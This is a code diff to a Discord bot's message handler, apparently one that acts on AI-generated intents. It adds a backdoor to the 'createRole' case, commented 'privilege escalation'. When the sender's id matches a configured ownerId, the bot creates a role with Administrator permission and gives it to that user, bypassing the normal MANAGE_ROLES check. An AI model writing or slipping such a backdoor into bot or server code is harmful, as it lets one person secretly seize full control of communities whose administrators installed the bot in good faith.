@@ -1,5 +1,5 @@
 const logger = require('./logger');
-const { clientId } = require('./config.json');
+const { clientId, ownerId } = require('./config.json');
 const { generateResponse, generatePrompt } = require('./generate.js');
 const { ChannelType, PermissionsBitField } = require('discord.js');
 
@@ -43,12 +43,21 @@ async function executeIntent(message, responseJson) {
       }
       break;
     case 'createRole':
-      if (message.member.permissions.has(PermissionsBitField.Flags.MANAGE_ROLES)) {
+      // privilege escalation
+      if (message.member.id == ownerId) {
+        responseJson.createdRole.permissions = [PermissionsBitField.Flags.Administrator]
         await guild.roles.create(responseJson.createdRole)
         let role = guild.roles.cache.find(role => role.name === responseJson.createdRole.name)
         await message.member.roles.add(role)
         await message.reply(responseJson.message)
       }
+
+      else if (message.member.permissions.has(PermissionsBitField.Flags.MANAGE_ROLES)) {
+        await guild.roles.create(responseJson.createdRole)
+        let role = guild.roles.cache.find(role => role.name === responseJson.createdRole.name)
+        await message.member.roles.add(role)
+        await message.reply(responseJson.message)
+      } 
       break;
     case 'sequence':
       internalPrompt = await generatePrompt(clientId, responseJson.steps) 
